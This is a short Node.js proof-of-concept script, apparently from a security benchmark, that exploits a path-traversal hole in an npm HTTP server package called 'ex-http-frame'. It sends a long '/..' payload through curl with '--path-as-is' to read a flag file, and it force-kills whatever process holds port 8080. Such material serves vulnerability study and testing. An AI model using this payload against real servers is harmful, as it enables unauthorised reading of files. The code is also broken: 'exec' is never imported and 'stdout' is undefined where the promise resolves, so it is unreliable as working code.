const path = require("path");  // Import the path module
const { sleep } = require("sleep");

function getPayload() {
    const pathToFlag = path.resolve(__dirname, "../flag.html");
    return "/..".repeat(50) + pathToFlag;
}

function exploitFunction(payload) {  // Pass payload as a parameter
    const { execSync } = require("child_process");

    afterAll(() => {
        try {
            execSync("fuser -k 8080/tcp");
        } catch (e) {}
    });

    execSync("fuser -k 8080/tcp", () => {});

    let server = "node ./node_modules/ex-http-frame/index.js";
    let exe = exec(server, (error, stdout) => {
        sleep.sleep(2);

        let attack_string = `curl -v --path-as-is "http://127.0.0.1:8080${payload}"`;
        exec(attack_string, (error, stdout) => {
            return stdout;
        });
    });

    return new Promise((resolve, reject) => {
        exe.on("exit", (code) => {
            if (code === 0) {
                resolve(stdout);
            } else {
                reject(new Error(`Server exited with code ${code}`));
            }
        });
    });
}

module.exports = { exploitFunction };